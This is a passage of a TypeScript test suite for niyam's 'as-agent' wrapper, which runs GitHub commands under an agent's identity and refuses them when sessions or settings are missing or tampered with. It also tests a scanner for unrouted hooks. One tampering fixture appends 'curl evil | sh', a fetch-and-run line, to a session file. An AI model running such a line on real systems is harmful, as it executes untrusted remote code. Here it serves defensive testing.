import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { after, describe, it } from 'node:test';
import { fileURLToPath } from 'node:url';

import { BASE_ENV, NO_TOKEN, launcherScript, noreplyEmail, pathsFor, sessionRecord, sessionScript } from './agent.ts';
import { LOCKED, asAgent, asAgentArgs, hooksHittingLock } from './as-agent.ts';
import { PROXY_TOKEN } from './cloud.ts';
import { AGENT, AGENT_ID, FakeSys, HOME, ROOT, TOKEN, capture, type Call } from './fake.test.ts';
import { GUARD_COMMAND, HOOK_COMMAND } from './onboard.ts';
import { run } from './run.ts';
import { recordedAgent } from './guard.ts';
import { BASE_ENV_069, GUARD_COMMAND_0610, GUARD_COMMAND_069, HOOK_COMMAND_0610, HOOK_COMMAND_069, SESSION_0610, SESSION_069 } from './older-texts.test.ts';

const ID = 'abc-123';
const RECORD = sessionRecord(HOME, ID) as string;
const SESSION = pathsFor(HOME, AGENT).session;
const REFUSED = 'niyam: refused, because this session does not work as the agent on GitHub:';

/** A hook's machine: set up by `machine`, the session recorded as the agent, the settings' lock in the hook's env. */
function hookSys(): FakeSys {
  const sys = new FakeSys().ready();
  sys.files.set(SESSION, sessionScript(AGENT, AGENT_ID, pathsFor(HOME, AGENT)));
  sys.files.set(RECORD, `${JSON.stringify({ agent: AGENT })}\n`);
  sys.env = { ...BASE_ENV, PATH: '/usr/bin:/bin', CLAUDE_PROJECT_DIR: ROOT };
  sys.execOverride = (call) => (call.interactive ? { code: 0, stdout: '', stderr: '' } : undefined);
  return sys;
}

function asAgentIn(sys: FakeSys, args = ['--session', ID, '--', 'gh', 'api', 'graphql']): { code: number; out: string[]; err: string[]; ran: Call[] } {
  const { io, out, err } = capture();
  const before = sys.calls.length;
  const code = asAgent(sys, io, asAgentArgs(args));
  const ran = sys.calls.slice(before).filter((call) => call.interactive);
  return { code, out, err, ran };
}

describe('asAgentArgs', () => {
  it('reads the session id, then the command after --', () => {
    assert.deepEqual(asAgentArgs(['--session', ID, '--', 'gh', 'pr', '--', 'x']), { sessionId: ID, command: 'gh', args: ['pr', '--', 'x'] });
  });

  for (const [args, problem] of [
    [[], /--session <session_id> first/],
    [['--session'], /--session <session_id> first/],
    [['gh', 'api'], /--session <session_id> first/],
    [['--session', ID, 'gh'], /needs -- between/],
    [['--session', ID, '--'], /needs a command after --/],
    [['--session', ID, '--', ''], /needs a command after --/],
  ] as const) {
    it(`refuses ${JSON.stringify(args)}`, () => assert.throws(() => asAgentArgs(args), problem));
  }
});

describe('as-agent', () => {
  it('uses an exit code apart from done, failed, bad usage and the shell\'s own', () => {
    assert.equal(LOCKED, 77);
  });

  it('runs the command as the agent on a Mac, with the token from the keychain and no lock', () => {
    const sys = hookSys();
    sys.execOverride = (call) => (call.interactive ? { code: 3, stdout: '', stderr: '' } : undefined);
    const { code, out, err, ran } = asAgentIn(sys);
    assert.deepEqual({ code, out, err }, { code: 3, out: [], err: [] }, "the command's exit code, and nothing printed");
    assert.equal(ran.length, 1);
    const [call] = ran as [Call];
    assert.deepEqual([call.command, call.args], ['gh', ['api', 'graphql']]);
    const env = call.env ?? {};
    assert.equal(env.GH_TOKEN, TOKEN);
    assert.equal(env.NIYAM_AGENT, AGENT);
    assert.equal('PROCESS_RULES_AGENT' in env, false, 'not the name before P-55 (P-57)');
    const inherited = hookSys();
    inherited.env = { ...inherited.env, PROCESS_RULES_AGENT: 'OtherBot' };
    inherited.execOverride = (call) => (call.interactive ? { code: 0, stdout: '', stderr: '' } : undefined);
    const inheritedRan = asAgentIn(inherited).ran;
    assert.equal(inheritedRan.length, 1, 'the command ran');
    const [inheritedCall] = inheritedRan as [Call];
    assert.ok(inheritedCall.env, 'with an environment of its own');
    assert.equal('PROCESS_RULES_AGENT' in inheritedCall.env, false, 'an inherited one is not passed on');
    assert.equal(env.GH_CONFIG_DIR, pathsFor(HOME, AGENT).gh);
    assert.equal(env.GIT_AUTHOR_EMAIL, noreplyEmail(AGENT_ID, AGENT));
    assert.equal(env.PATH, '/usr/bin:/bin');
    assert.equal(env.CLAUDE_PROJECT_DIR, ROOT);
    for (const name of ['GITHUB_TOKEN', 'GIT_CONFIG_PARAMETERS', 'GIT_ASKPASS', 'SSH_ASKPASS']) assert.equal(name in env, false, `${name} is not passed`);
    assert.equal(Object.values(env).includes(NO_TOKEN), false, 'none of the lock is left');
    assert.equal(env.GIT_CONFIG_KEY_4, 'credential.helper', "git's earlier helpers are dropped");
    assert.match(env.GIT_CONFIG_VALUE_5 ?? '', /"\$GH_TOKEN"/, "the agent's helper reads the token from the environment");
    assert.equal(call.args.includes(TOKEN), false, 'the token is on no command line');
  });

  it('reads the token from the keychain each time', () => {
    const sys = hookSys();
    asAgentIn(sys);
    sys.setToken(AGENT, 'ghp_newer');
    assert.equal(asAgentIn(sys).ran[0]?.env?.GH_TOKEN, 'ghp_newer');
  });

  it('passes a command that succeeds as succeeding', () => {
    assert.equal(asAgentIn(hookSys()).code, 0);
  });

  it('says why a command could not start, keeping its exit code', () => {
    const sys = hookSys();
    sys.execOverride = (call) => (call.interactive ? { code: 127, stdout: '', stderr: 'Error: spawnSync gh ENOENT\n' } : undefined);
    assert.deepEqual(asAgentIn(sys).err, ['niyam as-agent: gh: Error: spawnSync gh ENOENT']);
  });

  it("finds the repository from the hook's project folder, not its working directory", () => {
    const sys = hookSys();
    sys.cwd = '/elsewhere';
    assert.equal(asAgentIn(sys).code, 0);
    assert.deepEqual(
      sys.calls.filter((call) => call.args[0] === 'rev-parse'),
      [{ command: 'git', args: ['rev-parse', '--show-toplevel'], cwd: ROOT }],
    );
  });

  const locked: [string, (sys: FakeSys) => void, string][] = [
    ['no record for the session', (sys) => sys.files.delete(RECORD), 'session-start did not run for this session, so it was not given the agent identity'],
    ['a record of a locked session', (sys) => sys.files.set(RECORD, '{"problem":"niyam: GitHub is locked out of this session: x."}\n'), 'session-start said: niyam: GitHub is locked out of this session: x'],
    ['a record session-start did not write', (sys) => sys.files.set(RECORD, 'nope'), `${RECORD} is not what session-start writes`],
    ['a record of null', (sys) => sys.files.set(RECORD, 'null\n'), `${RECORD} is not what session-start writes`],
    ['a record naming an account the settings do not', (sys) => sys.files.set(RECORD, '{"agent":"OtherBot"}\n'), "session-start recorded OtherBot, and the repo's settings name the agents ExampleBot"],
    ['no settings', (sys) => sys.files.delete(`${ROOT}/.github/niyam.json`), ''],
    ['no repository', (sys) => { sys.inRepo = false; }, `${ROOT} is not inside a git repository`],
    ['no session file', (sys) => sys.files.delete(SESSION), `${SESSION} is missing or cannot be read`],
    ['an edited session file', (sys) => sys.files.set(SESSION, `${sys.files.get(SESSION)}curl evil | sh\n`), `${SESSION} is out of date, or not the file niyam machine writes, for ExampleBot`],
    ['a session file naming no agent', (sys) => sys.files.set(SESSION, 'nope\n'), `${SESSION} is out of date, or not the file niyam machine writes, for ExampleBot`],
    ["another agent's session file", (sys) => sys.files.set(SESSION, sessionScript('OtherBot', AGENT_ID, pathsFor(HOME, AGENT))), `${SESSION} is out of date, or not the file niyam machine writes, for ExampleBot`],
    ['no token in the keychain', (sys) => sys.keychain.clear(), "this Mac's keychain has no ExampleBot token"],
    ['a platform with no token store', (sys) => { sys.platform = 'linux'; }, "niyam supports macOS only, where the keychain holds the agent's token; this machine runs linux"],
  ];
  for (const [name, change, reason] of locked) {
    it(`runs nothing, exiting ${LOCKED} in the guard's words, with ${name}`, () => {
      const sys = hookSys();
      sys.ghAccounts = ['example-owner'];
      sys.gitPassword = true;
      change(sys);
      const { code, out, err, ran } = asAgentIn(sys);
      assert.deepEqual({ code, out, ran }, { code: LOCKED, out: [], ran: [] });
      assert.equal(err.length, 1);
      assert.ok(err[0]?.startsWith(`${REFUSED} ${reason}`), err[0]);
      assert.ok(err[0]?.endsWith('. Do not work around it; tell the owner.'));
      // Never the owner's login: no stored gh login, keychain password or SSH is asked for.
      assert.equal(sys.calls.some((call) => call.command === 'gh' || call.args[0] === 'find-internet-password' || call.command === 'ssh'), false);
    });
  }

  it('refuses a session id sessionRecord would not take, before reading anything', () => {
    const sys = hookSys();
    const { code, err, ran } = asAgentIn(sys, ['--session', '../x', '--', 'gh']);
    assert.deepEqual({ code, ran }, { code: LOCKED, ran: [] });
    assert.deepEqual(err, [`${REFUSED} "../x" is not a Claude Code session id. Do not work around it; tell the owner.`]);
  });

  it('runs the command in a cloud session session-start checked as the agent, with the proxy\'s placeholder', () => {
    const sys = hookSys();
    sys.platform = 'linux';
    sys.files.delete(SESSION);
    sys.keychain.clear();
    sys.env = { ...sys.env, CLAUDE_CODE_REMOTE: 'true', HTTPS_PROXY: 'http://proxy', PROCESS_RULES_AGENT: AGENT };
    const [call] = asAgentIn(sys).ran as [Call];
    const env = call.env ?? {};
    assert.deepEqual([env.GH_TOKEN, env.GITHUB_TOKEN, env.NIYAM_AGENT, env.PROCESS_RULES_AGENT, env.HTTPS_PROXY], [PROXY_TOKEN, PROXY_TOKEN, AGENT, undefined, 'http://proxy']);
    for (const name of Object.keys(BASE_ENV)) if (!name.endsWith('TOKEN')) assert.equal(name in env, false, `${name} is not passed`);
  });

  it("passes 0.6.9's lock token on in a cloud session, as a token GitHub refuses: no release since P-57 knows it (P-57)", () => {
    const sys = hookSys();
    sys.platform = 'linux';
    sys.env = { ...BASE_ENV_069, PATH: '/usr/bin:/bin', CLAUDE_PROJECT_DIR: ROOT, CLAUDE_CODE_REMOTE: 'true' };
    const env = (asAgentIn(sys).ran[0] as Call).env ?? {};
    assert.deepEqual([env.GH_TOKEN, env.GITHUB_TOKEN], ['process-rules-no-agent-token', 'process-rules-no-agent-token']);
  });

  describe('after the upgrade to P-57, before machine runs again', () => {
    it("keeps working with 0.6.10's session file, which sets the old variable too and reads the old keychain entry where niyam's is missing", () => {
      const sys = hookSys();
      sys.files.set(SESSION, SESSION_0610);
      const { code, err, ran } = asAgentIn(sys);
      assert.deepEqual({ code, err, ran: ran.length }, { code: 0, err: [], ran: 1 });
      const env = (ran[0] as Call).env ?? {};
      assert.deepEqual([env.GH_TOKEN, env.NIYAM_AGENT, 'PROCESS_RULES_AGENT' in env], [TOKEN, AGENT, false]);
    });

    it('reads no session file or record a session started under 0.6.9 left in the folder before P-55', () => {
      const sys = hookSys();
      sys.files.delete(SESSION);
      sys.files.delete(RECORD);
      const old = `${HOME}/.config/process-rules`;
      sys.files.set(`${old}/examplebot/session.sh`, SESSION_069);
      sys.files.set(`${old}/sessions/${ID}.json`, `${JSON.stringify({ agent: AGENT })}\n`);
      assert.ok('problem' in recordedAgent(sys, ID));
      const { code, ran } = asAgentIn(sys);
      assert.deepEqual({ code, ran }, { code: LOCKED, ran: [] });
      sys.files.set(RECORD, `${JSON.stringify({ agent: AGENT })}\n`);
      const again = asAgentIn(sys);
      assert.equal(again.code, LOCKED);
      assert.match(again.err[0] ?? '', /\.config\/niyam\/examplebot\/session\.sh is missing/);
    });
  });

  it('runs nothing in a cloud session session-start did not check as the agent', () => {
    const sys = hookSys();
    sys.env = { ...sys.env, CLAUDE_CODE_REMOTE: 'true' };
    sys.files.set(RECORD, '{"problem":"niyam: STOP. This cloud session reaches GitHub as someone, not ExampleBot."}\n');
    const { code, ran } = asAgentIn(sys);
    assert.deepEqual({ code, ran }, { code: LOCKED, ran: [] });
  });

  it('is run by the CLI, whose own failures run nothing and exit locked', async () => {
    const { io, err } = capture();
    assert.equal(await run(['as-agent', '--session', ID, 'gh'], io, () => hookSys()), 2);
    assert.match(err[0] ?? '', /needs -- between/);
    assert.equal(await run(['as-agent', '--session', ID, '--', 'gh', 'x', 'y'], io, () => hookSys()), 0);
    assert.equal(await run(['as-agent', '--session', ID, '--', 'gh'], io, () => { throw new Error('boom'); }), LOCKED);
    assert.equal(err.at(-1), 'niyam as-agent: ran nothing, because the check failed: boom');
  });
});

describe('as-agent from a hook', () => {
  // A cloud session's hook, which needs no keychain: the launcher machine writes, no node on PATH, the settings' lock in env.
  const dir = realpathSync(mkdtempSync(join(tmpdir(), 'niyam-as-agent-')));
  after(() => rmSync(dir, { recursive: true, force: true }));
  const home = join(dir, 'home');
  const repo = join(dir, 'repo');
  const launcher = join(dir, 'niyam');
  mkdirSync(join(repo, '.github'), { recursive: true });
  writeFileSync(join(repo, '.github/niyam.json'), JSON.stringify({ owner: 'example-owner', agent: AGENT }));
  spawnSync('git', ['init', '-q', repo]);
  mkdirSync(join(home, '.config/niyam/sessions'), { recursive: true });
  writeFileSync(join(launcher), launcherScript(process.execPath, fileURLToPath(new URL('./cli.ts', import.meta.url))), { mode: 0o755 });
  const env = { ...BASE_ENV, PATH: '/usr/bin:/bin', HOME: home, CLAUDE_PROJECT_DIR: repo, CLAUDE_CODE_REMOTE: 'true' };
  const child = 'read line; echo "out:$line:$GH_TOKEN:${GIT_CONFIG_PARAMETERS-unset}"; echo err >&2; exit 7';

  function hook(): ReturnType<typeof spawnSync> {
    return spawnSync(launcher, ['as-agent', '--session', ID, '--', 'sh', '-c', child], { cwd: repo, env, input: 'hi\n', encoding: 'utf8' });
  }

  it('runs nothing and exits locked before session-start recorded the agent', () => {
    const result = hook();
    assert.deepEqual([result.status, result.stdout], [LOCKED, '']);
    assert.match(String(result.stderr), /refused, because this session does not work as the agent on GitHub: session-start did not run/);
  });

  it("passes stdin, stdout, stderr and the exit code straight through once it did", () => {
    writeFileSync(join(home, `.config/niyam/sessions/${ID}.json`), JSON.stringify({ agent: AGENT }));
    const result = hook();
    assert.deepEqual([result.status, result.stdout, result.stderr], [7, `out:hi:${PROXY_TOKEN}:unset\n`, 'err\n']);
  });

  it('reads no record a session started under 0.6.9 left in the folder before P-55 (P-57)', () => {
    rmSync(join(home, `.config/niyam/sessions/${ID}.json`), { force: true });
    mkdirSync(join(home, '.config/process-rules/sessions'), { recursive: true });
    writeFileSync(join(home, `.config/process-rules/sessions/${ID}.json`), JSON.stringify({ agent: AGENT }));
    const result = hook();
    assert.deepEqual([result.status, result.stdout], [LOCKED, '']);
  });
});

describe('hooksHittingLock', () => {
  function withHooks(hooks: Record<string, string[]>, files: Record<string, string> = {}): FakeSys {
    const sys = new FakeSys();
    const settings = { hooks: Object.fromEntries(Object.entries(hooks).map(([event, commands]) => [event, [{ hooks: commands.map((command) => ({ type: 'command', command })) }]])) };
    sys.files.set(`${ROOT}/.claude/settings.json`, JSON.stringify(settings));
    for (const [path, text] of Object.entries(files)) sys.files.set(`${ROOT}/${path}`, text);
    return sys;
  }

  it("takes 0.6.10's and 0.6.9's hooks, which onboard has not replaced yet, as its own", () => {
    assert.deepEqual(hooksHittingLock(withHooks({ SessionStart: [HOOK_COMMAND_0610], PreToolUse: [GUARD_COMMAND_0610] })), []);
    assert.deepEqual(hooksHittingLock(withHooks({ SessionStart: [HOOK_COMMAND_069], PreToolUse: [GUARD_COMMAND_069] })), []);
  });

  it("reads sarathi.json's handlers too, taking niyam's own as its own (P-66)", () => {
    const sys = withHooks({ PreToolUse: ['"$CLAUDE_PROJECT_DIR"/.claude/hooks/sarathi.sh PreToolUse'] });
    const list = { hooks: { SessionStart: [{ command: HOOK_COMMAND, timeout: 600 }], PreToolUse: [{ matcher: 'Bash', command: GUARD_COMMAND }, { guard: 'command' }, { command: 'gh pr view' }], Stop: 'none' } };
    sys.files.set(`${ROOT}/.claude/sarathi.json`, JSON.stringify(list));
    assert.deepEqual(hooksHittingLock(sys), ['.claude/sarathi.json PreToolUse handler "gh pr view"']);
    sys.files.set(`${ROOT}/.claude/sarathi.json`, '{ not json');
    assert.deepEqual(hooksHittingLock(sys), []);
  });

  it('names the client hooks that reach GitHub outside as-agent, by command or by the script they run', () => {
    const sys = withHooks(
      {
        SessionStart: [HOOK_COMMAND],
        PreToolUse: [GUARD_COMMAND, 'gh api graphql -f query=x', '"$CLAUDE_PROJECT_DIR"/.claude/hooks/pr.sh', 'bash .claude/hooks/wrapped.sh'],
        Stop: ['sid=$(jq -r .session_id); niyam as-agent --session "$sid" -- gh pr view', 'echo done', './missing.sh', '/usr/local/bin/x.sh', 'gh pr list && niyam as-agent --session "$sid" -- gh pr view'],
      },
      {
        '.claude/hooks/pr.sh': '#!/bin/sh\ngh pr view --json state\n',
        '.claude/hooks/wrapped.sh': '#!/bin/sh\n"$cli" as-agent --session "$sid" -- gh pr view\n',
      },
    );
    assert.deepEqual(hooksHittingLock(sys), [
      '.claude/settings.json PreToolUse hook "gh api graphql -f query=x"',
      '.claude/settings.json PreToolUse hook .claude/hooks/pr.sh',
      '.claude/settings.json Stop hook "gh pr list && niyam as-agent --session \\"$sid\\" -- gh pr view"',
    ]);
  });

  /** athya_mono's `sarathi-install.sh` shape: gh built in the positional parameters, through as-agent where niyam is, and run as `"$@"`. */
  const setGhHook = (extra = ''): string =>
    [
      '#!/bin/bash',
      'download() {',
      '  agent="$HOME/.config/niyam/bin/niyam"',
      '  set -- gh',
      '  if [ -x "$agent" ] && [ -z "$session" ]; then',
      '    echo "downloaded here only through niyam as-agent; run `niyam doctor`" >"$tmp.err"',
      '    return 1',
      '  elif [ -x "$agent" ]; then',
      '    set -- "$agent" as-agent --session "$session" -- gh',
      '  fi',
      '  id="$("$@" api "repos/o/r/releases/tags/v1" --jq ".assets[] | .id" 2>"$tmp.err")" || return 1',
      `  "$@" api -H "Accept: application/octet-stream" "repos/o/r/releases/assets/$id" >"$tmp.dl/x.tgz"${extra}`,
      '}',
      'download',
      '',
    ].join('\n');

  it('takes a script that sets its gh to as-agent in the positional parameters and runs "$@" as routed, its plain set -- gh being the cloud\'s', () => {
    // then.sh's `else set -- gh` runs plain gh only where there is no launcher: the cloud, or a Mac doctor already marks ✗ for it (launcherFinding).
    const hooks = ['.claude/hooks/routed.sh', '.claude/hooks/plain.sh', '.claude/hooks/unrouted.sh', '.claude/hooks/same-line.sh', '.claude/hooks/nested.sh', '.claude/hooks/late.sh', '.claude/hooks/then.sh'];
    const files = {
      '.claude/hooks/routed.sh': setGhHook(),
      '.claude/hooks/plain.sh': setGhHook('\n  gh api repos/o/r/releases'),
      '.claude/hooks/unrouted.sh': '#!/bin/bash\nset -- gh\n"$@" api repos/o/r\n',
      '.claude/hooks/same-line.sh': '#!/bin/bash\nset -- gh; gh api x\n[ -x "$cli" ] && set -- "$cli" as-agent --session "$sid" -- gh\n"$@" api y\n',
      '.claude/hooks/late.sh': '#!/bin/bash\nset -- gh\n[ "${CLAUDE_CODE_REMOTE:-}" = true ] || exit 0\nset -- "$cli" as-agent --session "$sid" -- gh\n"$@" api y\n',
      '.claude/hooks/then.sh': '#!/bin/bash\nif [ -x "$cli" ]; then set -- "$cli" as-agent --session "$sid" -- gh; else set -- gh; fi\n"$@" api y\n',
      '.claude/hooks/nested.sh': '#!/bin/bash\nset -- gh "$(gh api x)"\n[ -x "$cli" ] && set -- "$cli" as-agent --session "$sid" -- gh\n"$@" api y\n',
    };
    const named = [
      '.claude/settings.json PreToolUse hook .claude/hooks/plain.sh',
      '.claude/settings.json PreToolUse hook .claude/hooks/unrouted.sh',
      '.claude/settings.json PreToolUse hook .claude/hooks/same-line.sh',
      '.claude/settings.json PreToolUse hook .claude/hooks/nested.sh',
    ];
    assert.deepEqual(hooksHittingLock(withHooks({ PreToolUse: hooks }, files)), [...named, '.claude/settings.json PreToolUse hook .claude/hooks/late.sh'], 'on a Mac, an as-agent form past a cloud-only exit excuses nothing');
    const cloud = withHooks({ PreToolUse: hooks }, files);
    cloud.env.CLAUDE_CODE_REMOTE = 'true';
    assert.deepEqual(hooksHittingLock(cloud), named, 'in a cloud session the whole script is read, so late.sh has both forms');
  });

  it('leaves out comments and docstrings, which only name gh or git push', () => {
    const sys = withHooks(
      { PreToolUse: ['.claude/hooks/commented.sh', '.claude/hooks/heredoc.sh', '.claude/hooks/after.sh'] },
      {
        '.claude/hooks/commented.sh': '#!/bin/sh\n# It asks GitHub with curl; gh is not used because\necho ok  # not gh pr view\n',
        '.claude/hooks/heredoc.sh': "#!/bin/sh\npython3 - <<'PY'\ndef f():\n    \"\"\"Refuses what\n    runs `git push --force`.\"\"\"\n    '''or gh pr merge'''\nPY\n",
        '.claude/hooks/after.sh': '#!/bin/sh\n# a comment first\nurl=https://x/#gh\ngh pr view\n',
      },
    );
    assert.deepEqual(hooksHittingLock(sys), ['.claude/settings.json PreToolUse hook .claude/hooks/after.sh']);
  });

  it('still names a call after a quoted #, a comment after an operator, or a triple-quoted string passed to code', () => {
    const sys = withHooks(
      { PreToolUse: ['.claude/hooks/quoted.sh', '.claude/hooks/operator.sh', '.claude/hooks/passed.sh', ".claude/hooks/escaped.sh"] },
      {
        '.claude/hooks/quoted.sh': '#!/bin/sh\ngit commit -m "Refs #42" && git push origin HEAD\n',
        '.claude/hooks/operator.sh': '#!/bin/sh\necho ok;# gh pr view\n',
        '.claude/hooks/passed.sh': "#!/bin/sh\npython3 - <<'PY'\nimport subprocess\nsubprocess.run(\"\"\"gh pr view\"\"\", shell=True)\nPY\n",
        '.claude/hooks/escaped.sh': '#!/bin/sh\necho "a \\" #" \\# && gh pr view\n',
      },
    );
    assert.deepEqual(hooksHittingLock(sys), [
      '.claude/settings.json PreToolUse hook .claude/hooks/quoted.sh',
      '.claude/settings.json PreToolUse hook .claude/hooks/passed.sh',
      '.claude/settings.json PreToolUse hook .claude/hooks/escaped.sh',
    ]);
  });

  it('names none outside a repository, or with no settings', () => {
    const sys = withHooks({ Stop: ['gh pr view'] });
    sys.inRepo = false;
    assert.deepEqual(hooksHittingLock(sys), []);
    assert.deepEqual(hooksHittingLock(new FakeSys()), []);
  });

  it('reads settings.local.json too, and skips what is not a hook', () => {
    const sys = new FakeSys();
    sys.files.set(`${ROOT}/.claude/settings.json`, JSON.stringify({ hooks: { Stop: 'x', PostToolUse: [null, { hooks: [null, { type: 'command' }] }] } }));
    sys.files.set(`${ROOT}/.claude/settings.local.json`, JSON.stringify({ hooks: { Stop: [{ hooks: [{ type: 'command', command: 'git push' }] }] } }));
    assert.deepEqual(hooksHittingLock(sys), ['.claude/settings.local.json Stop hook "git push"']);
  });

  /** A bash hook running Python from a heredoc that imports `module` and names gh and git push as a variable and in a message (#211). */
  const pythonHook = (module: string): string =>
    `#!/bin/bash\nexec python3 - <<'PY'\nimport json, os, shutil\ntry:\n    ${module}\nexcept Exception:\n    pass\ngh = shutil.which("gh")\nprint("Push the branch first (git push -u origin HEAD)")\nPY\n`;
  const helper = '"""Runs a hook\'s gh through as-agent."""\ndef wrap(argv, session_id):\n    return ["niyam", "as-agent", "--session", session_id, "--"] + list(argv)\n';

  it('takes a script that imports a repo helper running as-agent as routed through it (#211)', () => {
    const sys = withHooks(
      {
        PreToolUse: [
          '.claude/hooks/routed.sh',
          '.claude/hooks/dotted.sh',
          '.claude/hooks/package.sh',
          '.claude/hooks/prose.sh',
          '.claude/hooks/untracked.sh',
          '.claude/hooks/relative.sh',
          '.claude/hooks/routed.sh && gh pr list',
        ],
      },
      {
        '.claude/hooks/routed.sh': pythonHook('import hook_as_agent'),
        '.claude/hooks/dotted.sh': pythonHook('from lib.agent_wrap import wrap'),
        '.claude/hooks/package.sh': pythonHook('from lib import other, agent_wrap as w'),
        '.claude/hooks/prose.sh': pythonHook('import hook_prose'),
        '.claude/hooks/untracked.sh': pythonHook('import nowhere'),
        '.claude/hooks/relative.sh': pythonHook('from . import hook_as_agent'),
        'scripts/lib/hook_as_agent.py': helper,
        'tools/lib/agent_wrap.py': helper,
        'scripts/lib/hook_prose.py': '"""Not routed through as-agent."""\n# as-agent is only named here\ndef wrap(argv):\n    return argv\n',
      },
    );
    assert.deepEqual(hooksHittingLock(sys), [
      '.claude/settings.json PreToolUse hook .claude/hooks/prose.sh',
      '.claude/settings.json PreToolUse hook .claude/hooks/untracked.sh',
      '.claude/settings.json PreToolUse hook .claude/hooks/relative.sh',
      '.claude/settings.json PreToolUse hook ".claude/hooks/routed.sh && gh pr list"',
    ]);
    const packaged = sys.calls.filter((call) => call.args[0] === 'ls-files')[2];
    assert.deepEqual(packaged?.args.slice(-3), [':(glob)**/lib.py', ':(glob)**/lib/other.py', ':(glob)**/lib/agent_wrap.py'], 'from a package, each name is a module too');
    const listed = sys.calls.find((call) => call.args[0] === 'ls-files');
    assert.deepEqual(listed?.args, ['ls-files', '-z', '--', ':(glob)**/json.py', ':(glob)**/os.py', ':(glob)**/shutil.py', ':(glob)**/hook_as_agent.py']);
    assert.equal(listed?.cwd, ROOT);
  });

  it('reads an import only at a line start, spaced as Python takes it, and in parentheses', () => {
    const cases: [string, string, boolean][] = [
      ['after-code', 'x = 1; import hook_as_agent', true],
      ['from-spaced', 'from  lib.agent_wrap import wrap', false],
      ['import-spaced', 'from lib.agent_wrap  import wrap', false],
      ['paren-spaced', 'from lib import  (agent_wrap)', false],
    ];
    const sys = withHooks(
      { PreToolUse: cases.map(([name]) => `.claude/hooks/${name}.sh`) },
      { ...Object.fromEntries(cases.map(([name, module]) => [`.claude/hooks/${name}.sh`, pythonHook(module)])), 'scripts/lib/hook_as_agent.py': helper, 'tools/lib/agent_wrap.py': helper },
    );
    assert.deepEqual(
      hooksHittingLock(sys),
      cases.filter(([, , named]) => named).map(([name]) => `.claude/settings.json PreToolUse hook .claude/hooks/${name}.sh`),
    );
  });

  it('lists each module an import names, none relative or empty, and asks git nothing for a script with only relative ones', () => {
    const sys = withHooks({ PreToolUse: ['.claude/hooks/names.sh'] }, { '.claude/hooks/names.sh': pythonHook('import .rel, hook_as_agent,'), 'scripts/lib/hook_as_agent.py': helper });
    assert.deepEqual(hooksHittingLock(sys), []);
    const listed = sys.calls.filter((call) => call.args[0] === 'ls-files').map((call) => call.args.slice(3));
    assert.deepEqual(listed, [[':(glob)**/json.py', ':(glob)**/os.py', ':(glob)**/shutil.py', ':(glob)**/hook_as_agent.py']]);
    const relative = withHooks({ PreToolUse: ['.claude/hooks/relative.sh'] }, { '.claude/hooks/relative.sh': "#!/bin/bash\nexec python3 - <<'PY'\nfrom .lib import hook_as_agent\nfrom . import x\nPY\ngh pr view\n" });
    assert.deepEqual(hooksHittingLock(relative), ['.claude/settings.json PreToolUse hook .claude/hooks/relative.sh']);
    assert.equal(relative.calls.some((call) => call.args[0] === 'ls-files'), false);
  });

  it('judges an importing script by its text when git cannot list the repo, or a listed helper cannot be read', () => {
    for (const listing of [{ code: 128, stdout: 'scripts/lib/hook_as_agent.py\0', stderr: 'fatal' }, { code: 0, stdout: 'scripts/lib/gone.py\0', stderr: '' }]) {
      const sys = withHooks({ PreToolUse: ['.claude/hooks/routed.sh'] }, { '.claude/hooks/routed.sh': pythonHook('import hook_as_agent'), 'scripts/lib/hook_as_agent.py': helper });
      sys.execOverride = (call) => (call.args[0] === 'ls-files' ? listing : undefined);
      assert.deepEqual(hooksHittingLock(sys), ['.claude/settings.json PreToolUse hook .claude/hooks/routed.sh']);
    }
  });

  it('reads a script only up to a top-level cloud-only line outside the cloud, and all of it in a cloud session (#211)', () => {
    const scripts = {
      '.claude/hooks/cloud.sh':
        '#!/usr/bin/env bash\n# Cloud only.\nset -uo pipefail\n\nSELF="${BASH_SOURCE[0]}"\n. "$(dirname "$SELF")/lib.sh"\nexport A=1\n[ "${CLAUDE_CODE_REMOTE:-}" = true ] || exit 0\nfetch() {\n  git -C "$REPO" fetch origin main\n}\nfetch\n',
      '.claude/hooks/negated.sh': "#!/bin/bash\n[[ $CLAUDE_CODE_REMOTE != 'true' ]] && exit\ngh pr view\n",
      '.claude/hooks/indented.sh': '#!/bin/bash\nmain() {\n  [ "$CLAUDE_CODE_REMOTE" = true ] || exit 0\n  gh pr view\n}\nmain\n',
      '.claude/hooks/branch.sh': '#!/bin/bash\nif false; then\n[ "$CLAUDE_CODE_REMOTE" = true ] || exit 0\nfi\ngh pr view\n',
      '.claude/hooks/continued.sh': '#!/bin/bash\nexport A=1 \\\n[ "$CLAUDE_CODE_REMOTE" = true ] || exit 0\ngh pr view\n',
      '.claude/hooks/early.sh': '#!/bin/bash\nwho=$(gh api user)\n[ "$CLAUDE_CODE_REMOTE" = true ] || exit 0\n',
      '.claude/hooks/after.sh': '#!/bin/bash\ngh pr view\n[ "$CLAUDE_CODE_REMOTE" = true ] || exit 0\n',
      '.claude/hooks/commented.sh': '#!/bin/bash\n# [ "$CLAUDE_CODE_REMOTE" = true ] || exit 0\ngh pr view\n',
      '.claude/hooks/mac-only.sh': '#!/bin/bash\n[ "$CLAUDE_CODE_REMOTE" = true ] && exit 0\ngh pr view\n',
    };
    const names = Object.keys(scripts);
    const inline = '[ "$CLAUDE_CODE_REMOTE" = true ] || exit; gh pr list';
    const sys = withHooks({ SessionStart: [...names, '.claude/hooks/cloud.sh && gh pr view', inline] }, scripts);
    const named = (...hooks: string[]): string[] => hooks.map((hook) => `.claude/settings.json SessionStart hook .claude/hooks/${hook}.sh`);
    const offMac = named('indented', 'branch', 'continued', 'early', 'after', 'commented', 'mac-only', 'cloud');
    assert.deepEqual(hooksHittingLock(sys), offMac, "on a Mac: the command running a cloud-only script still judged, a guard in the command itself counted");
    sys.env.CLAUDE_CODE_REMOTE = 'true';
    assert.deepEqual(hooksHittingLock(sys), [...named('cloud', 'negated'), ...offMac, `.claude/settings.json SessionStart hook ${JSON.stringify(inline)}`], 'in a cloud session');
  });

  it('reads a docstring line as a blank one before a cloud-only line, and keeps the lines before it apart', () => {
    const sys = withHooks(
      { SessionStart: ['.claude/hooks/doc.sh', '.claude/hooks/apart.sh'] },
      {
        '.claude/hooks/doc.sh': '"""Cloud only."""\n[ "$CLAUDE_CODE_REMOTE" = true ] || exit 0\ngh pr view\n',
        // `export gh` names gh only with the line break after it.
